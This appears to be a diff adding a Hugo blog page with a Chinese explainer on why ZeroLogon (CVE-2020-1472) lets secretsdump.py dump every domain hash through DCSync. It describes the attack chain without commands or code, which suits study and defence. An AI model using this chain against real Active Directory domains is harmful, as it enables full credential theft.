+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">利用 ZeroLogon 置空机器账户密码后，为什么 secretsdump.py 能抓取域管哈希？
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">简要流程：ZeroLogon → 空掉域控机器账户密码 → 以机器账户身份发起 DCSync → 导出全域哈希。
+</span></span><span class="line"><span class="cl">关键原因在于：域控机器账户天然拥有从域数据库复制哈希的权限。
+</span></span><span class="line"><span class="cl"><span class="k">1.</span> ZeroLogon 漏洞做了什么？
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CVE-2020-1472 是 Netlogon 远程协议（MS-NRPC）中的一个高危身份验证绕过漏洞。
+</span></span><span class="line"><span class="cl">攻击者利用它在完全不知道域控机器账户密码的情况下，通过一组伪造的 Netlogon 会话，直接调用远程过程将域控机器账户（如 MASTERPC$）的密码设置为空字符串。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">此时，MASTERPC$ 的真实密码就成了“空”，对应的 NT Hash 就是 31d6cfe0d16ae931b73c59d7e0c089c0。
+</span></span><span class="line"><span class="cl">这等价于别人直接把你的管理员钥匙扔在地上，任何人捡起来就能用。
+</span></span><span class="line"><span class="cl"><span class="k">2.</span> 域控机器账户有什么特殊权限？
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">在 Active Directory 中，域控制器的机器账户（不是普通的客户端/服务器账户）默认属于 Domain Controllers 组。
+</span></span><span class="line"><span class="cl">这个组在域级别被授予了以下关键权限：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    复制目录更改（Replicating Directory Changes）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    复制目录更改全部（Replicating Directory Changes All）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">这两个权限允许持有者通过 DCSync（目录复制） 方式，从域控制器复制出整个域数据库（NTDS.dit）中的所有哈希，包括域管理员、所有用户、所有凭据。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    普通域用户没有这两个权限，只有域控机器账户、Domain Admins、Enterprise Admins 等少数对象才拥有。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">3.</span> secretsdump.py 的抓取原理（DCSync 模式）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">secretsdump.py 在指定了域控地址和凭据后，默认会尝试通过 DRSUAPI 接口模拟域控制器间的复制动作，请求 DSGetNCChanges 调用来拉取哈希。
+</span></span><span class="line"><span class="cl">这个动作本身就需要“复制目录更改”权限。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">有了被置空的 MASTERPC$ 机器账户：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    攻击端可以直接使用空密码模拟这个机器账户；
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    域控信任了这次认证（因为机器账户身份本身就是合法的，只是密码被强设为空）；
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    secretsdump.py 以该机器账户的身份，向域控发起 DCSync 请求。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">因为 MASTERPC$ 就是 Domain Controllers 组的成员，它天生具备复制权限，所以请求被允许，整个域的哈希一步到位地被导出。
+</span></span><span class="line"><span class="cl">于是你就能看到 Administrator 和其他所有用户的哈希。
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/vulncms-1%E5%A4%8D%E7%8E%B0/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">VulnCMS-1复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://www.ddosi.org/wp-content/uploads/2022/02/24.webp" loading="lazy" data-key="" data-hash="https://www.ddosi.org/wp-content/uploads/2022/02/24.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">渗透攻击学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2026 Oight
+    </section>
+    
+    <section class="powerby">
+        
+            Build by Oight <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
